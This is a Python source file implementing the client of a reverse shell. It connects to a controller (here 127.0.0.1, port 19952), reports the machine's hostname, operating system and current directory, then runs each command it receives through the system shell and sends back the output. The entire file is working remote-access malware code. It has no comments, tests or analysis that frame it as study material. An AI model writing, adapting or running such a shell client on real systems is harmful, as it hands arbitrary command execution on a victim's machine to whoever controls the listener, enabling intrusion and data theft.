import struct
import socket 
import subprocess
import os
import sys
import platform

HOST = '127.0.0.1'
PORT = 19952



with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    print("Connecting...")
    hostname = socket.gethostname()
    encoded_hostname = hostname.encode("utf-8")
    packning = struct.pack("!I", len(hostname))
    s.send(packning)
    s.send(encoded_hostname)

    SystemOS = platform.system()
    SystemOS_encoded = SystemOS.encode("utf-8")
    pack = struct.pack("!I", len(SystemOS))
    s.send(pack)
    s.send(SystemOS_encoded)

    while True:
        while True:
            cwd = os.getcwd()
            encoded_cwd = cwd.encode("utf-8")
            pack = struct.pack("!I", len(cwd))
            s.send(pack)
            s.send(encoded_cwd)



            längd_bytes = s.recv(4)
            if not längd_bytes:
                break
            längd = struct.unpack("!I", längd_bytes)[0]
            kommando = s.recv(längd)
            decode_kom = kommando.decode("utf-8")
            if decode_kom.startswith("cd"):
                x = decode_kom.split()
                os.chdir(path=x[1]) 
                packning = struct.pack("!I", 0)
                s.send(packning)
                s.send(b'')                       
                error_packning = struct.pack("!I", 0)
                s.send(error_packning)
                s.send(b'')

            elif decode_kom == "__exit__":
                break
            
            elif decode_kom == "__kill__":
                sys.exit()

            else:
                svar = subprocess.run(decode_kom, shell=True, capture_output=True)
                packning = struct.pack("!I", len(svar.stdout))
                error_packning = struct.pack("!I", len(svar.stderr))

                s.send(packning)
                s.send(svar.stdout)

                s.send(error_packning)
                s.send(svar.stderr)




